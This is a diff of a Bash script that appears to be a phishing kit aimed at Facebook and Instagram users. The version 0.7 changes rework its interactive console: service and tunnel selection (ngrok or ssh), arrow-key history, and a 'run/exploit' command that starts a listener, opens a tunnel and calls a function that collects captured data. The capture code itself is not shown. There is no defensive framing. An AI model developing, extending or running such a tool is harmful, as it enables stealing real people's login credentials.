@@ -40,6 +40,8 @@
 #     Adicionado suporte a repetição do ataque
 # v0.6 2023-03-31, Oliver Silva:
 #     Adicionado suporte ao modo interativo
+# v0.7 2023-04-27, Oliver Silva:
+#     Adicionado algumas regras no prompt bloqueando algumas teclas de atalhos
 #
 # Licença: MIT License
 #
@@ -49,6 +51,7 @@
 # Versão 0.4: Bug 'Segmentation fault' resolvido o qual foi causado pela recursão infinita
 # Versão 0.5: Repetição do ataque caso precise
 # Versão 0.6: Modo interativo adicionado
+# Versão 0.7: Tratamento do prompt, bloqueio das teclas de atalho
 #
 
 trap interruptTwo SIGINT SIGTSTP
@@ -62,7 +65,7 @@ serviceKey=0
 listenKey=0
 tunnelKey=0
 
-listReq=("php" "jq" "curl" "tar")
+listReq=("php" "jq" "curl" "tar" "toilet" "figlet")
 services=("facebook" "instagram")
 tunnels=("ngrok" "ssh")
 
@@ -248,7 +251,7 @@ version() {
 # Percorre a uma lista
 list() {
     array="$1"
-    
+    echo
     for index in $array ; do
 	echo -e "\e[0m\e[31m$index\e[0m"
     done
@@ -341,124 +344,209 @@ rerun() {
 }
 
 # Modo interativo
+usage_i() {
+    echo -e "\n\n\t\e[0mCommand\t\tDescription\n\t-------\t\t-----------\n\t?\t\tHelp menu\n\tquit\t\tStop this program\n\tshow <?>\tIt shows services, tunnels, default options. Replace <?> with one of these 3 commands\n\tuse <?>\t\tUse services and etc. Replace <?> with one of these commands\n\tset <?>\t\tDefine tunnels and etc. Replace <?> with one of these commands\n\trun\t\trun the setup\n\n"
+}
+
+options_i() {
+    echo -e "\n\e[0mModule options (service/${service:-No service}):\n\n\tName\tCurrent Setting\tRequire\tDescription\n\t----\t---------------\t-------\t-----------\n\tTunnel\t[${tunnel:-No tunnel}]\t\tno\tAllow the tunnel\n\n"
+}
+
 menu() {
-    while [ true ] ; do
-	if [ -n "$service" -a -z "$tunnel" ] ; then
-	    echo -e "\e[0mSelected Service => \e[31;1m$service\e[0m"
 
-	elif [ -n "$service" -a -n "$tunnel" ] ; then
-	    echo -e "\e[0mSelected Service => \e[31;1m$service\e[0m => \e[31;1m$tunnel\e[0m"
-	fi
+    scape=$(printf '\u1b')
+    cmd="\e[0m\e[31;1mDs\e[36;3m>\e[0m\e[34m"
 
-	echo -ne "\e[34;2;4mdsl\e[0m > \e[34;2m" ; read
+    while [[ true ]] ; do
 
-	# EMPTY
+	echo -ne "\r$cmd $comm"
 
-	if [ -z "$REPLY" ] ;then
-	   echo -e "\e[0m\e[33;1mError, try? or help for more help!\e[0m"
-	   menu
+	IFS= read -rsn1 mode
 
-    # QUIT
-    elif [ "$REPLY" == "quit" -o "$REPLY" == "exit" ] ;then
-      interrupt && exit 0
+	if [[ $mode == $scape ]] ; then
+	    IFS= read -rsn2 mode
 
-     # HELP
-    elif [ "$REPLY" == "help" -o "$REPLY" == "?" ] ;then
-      echo -e "\n\n\t\e[0mCommand\t\tDescription\n\t-------\t\t-----------\n\t?\t\tHelp menu\n\tquit\t\tStop this program\n\tshow <?>\tIt shows services, tunnels, default options. Replace <?> with one of these 3 commands\n\tuse <?>\t\tUse services and etc. Replace <?> with one of these commands\n\tset <?>\t\tDefine tunnels and etc. Replace <?> with one of these commands\n\trun\t\trun the setup\n\n"
+	    case $mode in
+		"[A")
+		    if [[ -n $previousComm ]] ; then
+			comm=$previousComm
+		    fi
+		    ;;
 
-    # SHOW
-    elif [ "${REPLY:0:4}" == "show" ] ; then
-	if [ -z "${REPLY:5}" ] ;then
-	    echo -e "\e[0m\e[33;1mCommands = services - tunnels - options ?\e[0m"
+		"[B")
+		    currentComm=$comm
+		    unset comm
+		    echo -ne "\r$cmd                 "
+		    ;;
+		*)
+            esac
 
-	    elif [ "${REPLY:5}" == "services" ] ;then
-	        list "${services[*]}"
-
-	    elif [ "${REPLY:5}" == "tunnels" ] ;then
-	        list "${tunnels[*]}"
-
-	    elif [ "${REPLY:5}" == "options" ] ;then
-	        echo -e "\e[0mModule options (service/${service:-No service}):\n\n\tName\tCurrent Setting\tRequire\tDescription\n\t----\t---------------\t-------\t-----------\n\tTunnel\t${tunnel:-ssh}\t\tno\tAllow the tunnel\n\n"
-
-	    else
-	        echo -e "\e[0m\e[33;1mCommands = services - tunnels - options ?\e[0m"
-
+	elif [[ $mode == $'\x7f' ]] ; then
+	    if [[ -n $comm ]] ; then
+		previousComm=${comm%?}
+		comm=$previousComm
+		printf "\b \b"
 	    fi
+     
+        elif [[ $mode == $'\0A' ]] ; then
+	    if [[ -n "$comm" ]] ; then
+		previousComm=$comm
 
-	# USE
-        elif [ "${REPLY:0:3}" == "use" ] ;then
-	    if [ "${REPLY:4:7}" == "service" ] ;then
-	  	if [ -n "${REPLY:12:8}" ] ;then 
-		    if [ "${REPLY:12}" == "facebook" -o "${REPLY:12}" == "instagram" ] ;then
-			service=${REPLY:12}
+		# quit, exit
+		if [[ "$comm" == "quit" ]] || 
+		   [[ "$comm" == "QUIT" ]] || 
+		   [[ "$comm" == "exit" ]] || 
+		   [[ "$comm" == "EXIT" ]] ; then
+		    interrupt && exit 0
+
+		# help, ?
+		elif [[ "$comm" == "help" ]] || 
+		     [[ "$comm" == "HELP" ]] || 
+		     [[ "$comm" == "?" ]] ; then
+		    usage_i
+
+		# show
+		elif [[ "${comm:0:4}" == "show" ]] ; then
+		    if [[ -n "${comm:5}" ]] ; then
+
+			if [[ "${comm:5}" == "services" ]] ; then
+      	    	            list "${services[*]}"
+
+			elif [[ "${comm:5}" == "tunnels" ]] ; then
+			    list "${tunnels[*]}"
+
+			elif [[ "${comm:5}" == "options" ]] ; then
+			    options_i
+
+			else
+
+			    echo -e "\n\e[0m\e[33;1mCommands = services - tunnels - options ?\e[0m"
+
+			fi
 
 		    else
-			echo -e "\e[0m\e[33;1mUnavailable service\e[0m"
+			echo -e "\n\e[0m\e[33;1mCommands = services - tunnels - options ?\e[0m"
 
 		    fi
 
-	        else
-		    echo -e "\e[0m\e[33;1mCommands = facebook - instagram - etc ?\e[0m"
+		# use
+		elif [[ "${comm:0:3}" == "use" ]] ; then
 
-		fi
+		    if [[ -n "${comm:4}" ]] ; then
 
-	    else
-		echo -e "\e[0m\e[33;1mCommands = service - etc ?\e[0m"
+		        if [[ "${comm:4:7}" == "service" ]] ; then
+			    if [[ -n "${comm:12}" ]] ; then
+				 
+				case "${comm:12}" in
+				    "facebook")
+					service="${comm:12}"
+					echo -e "\n\e[0m\e[31;1mService => $service\e[0m";;
 
-	    fi
+				    "instagram")
+					service="${comm:12}"
+					echo -e "\n\e[0m\e[31;1mService => $service\e[0m";;
 
-	# SET	
-	elif [ "${REPLY:0:3}" == "set" ] ; then
-	    if [ "${REPLY:4:6}" == "tunnel" ] ;then
-		if [ -n "${REPLY:11}" ] ;then
-		    if [ "${REPLY:11}" == "ngrok" ] ;then
-			if [ -n "$service" ] ;then
-			    tunnel=${REPLY:11}
+				    *)
+					echo -e "\n\e[0m\e[33;1mCommands = show services - ?\e[0m";;
+			        esac
+
+		            else
+				echo -e "\n\e[0m\e[33;1mCommands = facebook - instagram - ?\e[0m"
+
+			    fi
 
 			else
-		            echo -e "\e[0m\e[33;1mUse a service to be able to define the tunnel\e[0m"
+			    echo -e "\n\e[0m\e[33;1mCommands = service - ?\e[0m"
+
 		        fi
 
 		    else
-			echo -e "\e[0m\e[33;1minvalid tunnel\e[0m" 
+			echo -e "\n\e[0m\e[33;1mCommands = service - ?\e[0m"
+
 		    fi
+
+		# set
+		elif [[ "${comm:0:3}" == "set" ]] ; then
+		    if [[ "${comm:4:6}" == "tunnel" ]] ; then
 			
+			if [[ -n "${comm:11}" ]] ; then
+
+			    case "${comm:11}" in
+				"ngrok")
+				    if [[ -n "$service" ]] ; then
+			                tunnel=${comm:11}
+				        echo -e "\n\e[0m\e[31;1mTunnel => $tunnel\e[0m"
+				    else
+					echo -e "\n\e[0m\e[33;1m[!] Select a service before defining the tunnel\e[0m"
+				    fi
+				    ;;
+
+				"ssh")
+				    if [[ -n "$service" ]] ; then
+				        tunnel=${comm:11}
+				        echo -e "\n\e[0m\e[31;1mTunnel => $tunnel\e[0m"
+				    else
+					echo -e "\n\e[0m\e[33;1m[!] Select a service before defining the tunnel\e[0m"
+				    fi
+				    ;;
+
+				*)
+				    echo -e "\n\e[0m\e[33;1m[!] invalid tunnel\e[0m";;
+
+	    		    esac
+
+			else
+			    echo -e "\n\e[0m\e[33;1mCommands = ngrok - ssh - show tunnels - ?\e[0m"
+			
+			fi
+
+		    else
+			echo -e "\n\e[0m\e[33;1mCommands = tunnel - help\e[0m"
+
+		    fi
+
+		# run, execute, exploit
+		elif [[ "${comm:0:3}" == "run" ]] || 
+		     [[ "${comm:0:7}" == "execute" ]] || 
+		     [[ "${comm:0:7}" == "exploit" ]] ; then
+		    if [[ -n "$service" ]] && 
+		       [[ -z "$tunnel" ]] then
+			echo -e "\n\e[0mRunning the setup locally\e[0m..."
+			args="--listen --service $service"
+			listen && getDataCaptured
+
+		    elif [[ -n "$service" ]] && 
+			[[ -n "$tunnel" ]] ; then
+			echo -e "\n\e[0mRunning the configuration with tunnel\e[0m..."
+			args="--listen --service $service --tunnel $tunnel"
+			listen && tunnel && getDataCaptured
+
+		    else
+			echo -e "\n\e[0m\e[33;1m[!] No settings defined\e[0m"
+
+		    fi
+
 		else
-		    echo -e "\e[0m\e[33;1mCommands = ngrok - etc ?\e[0m"
+		    echo -e "\n\e[0m\e[33;1mCommands = ? - help\e[0m"
 		fi
 
-	    else
-		echo -e "\e[0m\e[33;1mCommands = tunnel - etc ?\e[0m"
+		unset comm
 
-	    fi
+	    else
+		echo -e "\n\e[0m\e[33;1mError, try? or help for more help!\e[0m"
 	
-	# RUN
-	elif [ "$REPLY" == "run" ] ;then
-	    if [ -n "$service" -a -n "$tunnel" -a "$tunnel" == "ngrok" -o "$tunnel" == "ssh" ] ;then
-		echo -e "\e[0mRunning configuration..."
-		args="--listen --service $service --tunnel $tunnel"
-		listen && tunnel && getDataCaptured
-
-	    elif [ -n "$service" -a -z "$tunnel" ] ;then
-		echo -e "\e[0mRunning configuration..."
-		args="--listen --service $service"
-		listen && getDataCaptured
-
-	    else
-		echo -e "\e[0m\e[33;1mNo configuration defined!\e[0m"
 	    fi
 
         else
-	    echo -e "\e[0m\e[33;1mCommands = ? - help\e[0m"
-
+	    comm+=$mode 
 	fi
-
     done
     interrupt
     exit 0
 }
 
 banner_two() {
+
     version=$(grep "^# Versão" "$0" | tail -1 | cut -d ":" -f 1 | tr -d \# | tr -d " a-zãV")
     dateUpdate=$(grep "^# v.*" dataSocial.sh | cut -d , -f 1 | tr -d \# | tr -d "a-z." | cut -c5-15 | tail -1)
 
